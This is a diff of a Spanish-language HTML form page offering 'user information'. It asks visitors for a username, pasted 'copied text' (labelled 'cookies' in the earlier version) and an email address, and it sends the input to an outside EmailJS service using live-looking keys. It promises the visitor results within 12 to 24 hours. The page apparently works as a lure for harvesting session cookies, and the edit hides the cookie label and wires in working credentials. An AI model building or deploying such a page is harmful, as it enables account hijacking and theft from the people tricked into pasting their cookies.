@@ -1,68 +1,84 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<title>informacion del usuario</title>
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-<script>
-(function(){
-    emailjs.init("TU_PUBLIC_KEY");
-})();
-</script>
-<style>
-body {
-    font-family: Arial, sans-serif;
-    background: #f4f6f8;
-}
-.contenedor {
-    background: white;
-    max-width: 400px;
-    margin: 60px auto;
-    padding: 30px;
-    border-radius: 8px;
-    box-shadow: 0 0 10px rgba(0,0,0,0.1);
-}
-input, textarea, button {
-    width: 100%;
-    margin-bottom: 15px;
-    padding: 10px;
-}
-button {
-    background: #2563eb;
-    color: white;
-    border: none;
-    cursor: pointer;
-}
-button:hover {
-    background: #1e40af;
-}
-.mensaje {
-    display: none;
-    text-align: center;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>Información del usuario</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f2f4f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #fff;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        h1 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        input, textarea {
+            width: 90%;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+        button {
+            padding: 12px 25px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #mensaje {
+            display: none;
+            color: green;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+    </style>
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // Inicializar EmailJS con tu Public Key
+        (function(){
+            emailjs.init("vbdxDlkyi1kNet13d");
+        })();
+    </script>
 </head>
 <body>
-
-<div class="contenedor" id="formulario">
-    <h2>Formulario</h2>
-    <input type="text" id="usuario" placeholder="Usuario / Nombre" required>
-    <textarea id="texto" placeholder="cookies" required></textarea>
-    <input type="email" id="correo" placeholder="Correo (tuyo)" required>
-    <button onclick="enviarFormulario()">Enviar</button>
-</div>
-
-<div class="contenedor mensaje" id="mensaje">
-    <h2>Gracias por enviar el formulario</h2>
-    <p>
-        En un plazo de <strong>12 a 24 horas</strong>,<br>
-        la información del usuario será enviada a tu correo electrónico.
-    </p>
+<div class="container">
+    <h1>Información del usuario</h1>
+    <form id="formulario">
+        <input type="text" id="usuario" placeholder="Usuario" required><br>
+        <textarea id="texto" placeholder="Texto copiado" rows="4" required></textarea><br>
+        <input type="email" id="correo" placeholder="Correo" required><br>
+        <button type="button" onclick="enviarFormulario()">Enviar</button>
+    </form>
+    <div id="mensaje">
+        ¡Formulario enviado! Por favor, espera de 12 a 24 horas para que te mandemos la información a tu correo.
+    </div>
 </div>
 
 <script>
 function enviarFormulario() {
-    emailjs.send("TU_SERVICE_ID","TU_TEMPLATE_ID",{
+    emailjs.send("service_9xolqhc", "template_eogisfu", {
         usuario: document.getElementById("usuario").value,
         texto: document.getElementById("texto").value,
         correo: document.getElementById("correo").value
@@ -71,6 +87,7 @@ function enviarFormulario() {
         document.getElementById("mensaje").style.display = "block";
     }, function(error) {
         alert("Error al enviar. Intenta nuevamente.");
+        console.log(error);
     });
 }
 </script>
